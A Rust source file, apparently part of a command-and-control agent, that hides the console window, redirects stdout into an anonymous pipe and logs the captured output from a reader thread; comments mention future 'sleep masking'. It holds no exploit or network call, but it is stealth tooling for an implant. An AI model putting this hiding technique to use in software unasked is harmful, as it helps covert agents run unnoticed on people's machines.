use std::{
    ffi::c_void,
    fmt::Display,
    ptr::null_mut,
    sync::{
        Mutex, Once, OnceLock,
        atomic::{AtomicPtr, Ordering},
    },
};

use windows_sys::Win32::{
    Foundation::HANDLE,
    Storage::FileSystem::ReadFile,
    System::{
        Console::{AllocConsole, GetConsoleWindow, STD_OUTPUT_HANDLE, SetStdHandle},
        Pipes::CreatePipe,
        Threading::CreateThread,
    },
    UI::WindowsAndMessaging::{SW_HIDE, ShowWindow},
};

static INIT_PIPE: Once = Once::new();
pub static CONSOLE_PIPE_HANDLE: AtomicPtr<c_void> = AtomicPtr::new(null_mut());
pub static CONSOLE_LOG: OnceLock<Mutex<Vec<u8>>> = OnceLock::new();

pub fn get_console_log() -> &'static Mutex<Vec<u8>> {
    CONSOLE_LOG.get_or_init(|| Mutex::new(Vec::new()))
}

pub fn init_agent_console() {
    INIT_PIPE.call_once(|| {
        let _ = get_console_log();

        //
        // Hide the window if it exists
        //
        let h_wnd = unsafe { GetConsoleWindow() };
        if !h_wnd.is_null() {
            unsafe { AllocConsole() };
            let h_w_n = unsafe { GetConsoleWindow() };
            if !h_w_n.is_null() {
                unsafe { ShowWindow(h_w_n, SW_HIDE) };
            }
        }

        let mut p_out = HANDLE::default();
        let mut p_in = HANDLE::default();
        if unsafe { CreatePipe(&mut p_out, &mut p_in, null_mut(), 0) } == 0 {
            // TODO idk best way to handle this
            // Also we may want to exit the thread not process

            #[cfg(debug_assertions)]
            {
                use windows_sys::Win32::Foundation::GetLastError;

                print_failed(format!(
                    "Failed to init anon pipe for console. {:#X}",
                    unsafe { GetLastError() }
                ));
            }

            std::process::exit(0);
        }

        CONSOLE_PIPE_HANDLE.store(p_out, Ordering::SeqCst);

        unsafe { SetStdHandle(STD_OUTPUT_HANDLE, p_in) };

        // TODO think about this in terms of doing funky things in the future like sleep masking.. does this cause
        // a problem having multiple threads on the go? Or can i just freeze them all? Idek how it works in that
        // much detail but.. we will see :)
        start_stdout_reader_thread()
    });
}

fn start_stdout_reader_thread() {
    unsafe { CreateThread(null_mut(), 0, Some(thread_loop), null_mut(), 0, null_mut()) };
}

unsafe extern "system" fn thread_loop(_: *mut c_void) -> u32 {
    unsafe {
        let mut buf = [0u8; 4096];
        let h_read = CONSOLE_PIPE_HANDLE.load(Ordering::SeqCst);

        loop {
            let mut bytes_read: u32 = 0;
            let ok = ReadFile(
                h_read,
                buf.as_mut_ptr() as *mut _,
                buf.len() as u32,
                &mut bytes_read,
                std::ptr::null_mut(),
            );
            if ok == 0 || bytes_read == 0 {
                // TODO this is bad other than at process shutdown?
                break;
            }

            if !buf.is_empty() {
                let mut log = get_console_log().lock().unwrap();
                log.extend_from_slice(&buf[..bytes_read as usize]);
            }
        }
    }

    1
}

/// Prints debug output via `OutputDebugStringA`; this internally checks for the agent being built in
/// debug mode so this will not affect release builds.
#[macro_export]
macro_rules! dbgprint {
    ($($arg:tt)*) => {{
        #[cfg(debug_assertions)]
        {
            use std::ffi::CString;
            use windows_sys::{
                Win32::{
                    System::Diagnostics::Debug::{OutputDebugStringA},
                },
            };
            let mut s = format!($($arg)*);

            s.retain(|c| c != '\0');
            if let Ok(cstr) = CString::new(s) {
                unsafe {
                    OutputDebugStringA(cstr.as_ptr() as _);
                }
            }
        }
    }};
}

pub fn print_success(msg: impl Display) {
    println!("[+] {}", msg);
    dbgprint!("[+] {}", msg);
}

pub fn print_info(msg: impl Display) {
    println!("[i] {msg}");
    dbgprint!("[i] {}", msg);
}

pub fn print_failed(msg: impl Display) {
    println!("[-] {msg}");
    dbgprint!("[-] {}", msg);
}
